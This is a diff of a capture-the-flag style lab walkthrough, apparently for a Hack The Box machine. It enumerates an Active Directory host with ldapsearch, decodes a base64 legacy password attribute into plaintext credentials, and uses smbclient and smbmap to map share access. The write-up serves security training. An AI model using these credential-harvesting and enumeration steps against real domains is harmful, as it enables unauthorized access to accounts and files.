@@ -106,11 +106,11 @@
 
 // So i tried other ways like [kerbrute](https://github.com/TarlogicSecurity/kerbrute) and [responder](https://tools.kali.org/sniffingspoofing/responder)
 
-// And finally get the most valuable data with [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)(helping [examples](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/examples-of-common-ldapsearches))
+// And finally get the most valuable data with [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)(helping [examples](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/examples-of-common-ldapsearches)) and [linux4enum](https://tools.kali.org/information-gathering/enum4linux).
 
     $ ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" > ldapsearch_res.txt
 
-// The output is HUGE , so after some digging in the file, i will output the unique information
+// The output is HUGE , so after some digging in the file, i output the unique information(Users&groups and unique value)
 
     $ cat ldapsearch_res.txt | grep sAMAccountName
 -----
@@ -174,7 +174,7 @@
     $ cat ldapsearch_res.txt | grep cascadeLegacyPwd
     cascadeLegacyPwd: clk0bjVldmE=
 
-// We have a encrypted string, lets decrypt it
+// We have an encrypted string, lets decrypt it
 
     $echo 'clk0bjVldmE=' | base64 -d
     rY4n5eva
@@ -193,5 +193,44 @@
     lastLogonTimestamp: 132294360317419816
     msDS-SupportedEncryptionTypes: 0
     cascadeLegacyPwd: clk0bjVldmE=
-    
-// 
+-----
+
+    r.thompson : rY4n5eva
+
+// Earlier when scaned with enum4linux there waz shares enumerating that showed me 
+
+// that we not have permissions to shared files
+
+    [+] Got OS info for 10.10.10.182 from smbclient: 
+    [+] Got OS info for 10.10.10.182 from srvinfo:
+    Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+// could also check by urself with smbclient
+
+    $ smbclient -N -L \\10.10.10.182
+-----
+
+    Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+    SMB1 disabled -- no workgroup available
+
+// Now that we have creds we can See if we have permissions for any shared files
+
+
+    $smbmap -u r.thompson -p rY4n5eva -H cascade.local
+-----
+
+    [+] IP: cascade.local:445	Name: unknown                                           
+            Disk                                                  	Permissions	Comment
+        ----                                                  	-----------	-------
+        ADMIN$                                            	NO ACCESS	Remote Admin
+        Audit$                                            	NO ACCESS	
+        C$                                                	NO ACCESS	Default share
+        Data                                              	READ ONLY	
+        IPC$                                              	NO ACCESS	Remote IPC
+        NETLOGON                                          	READ ONLY	Logon server share 
+        print$                                            	READ ONLY	Printer Drivers
+        SYSVOL                                            	READ ONLY	Logon server share 
+
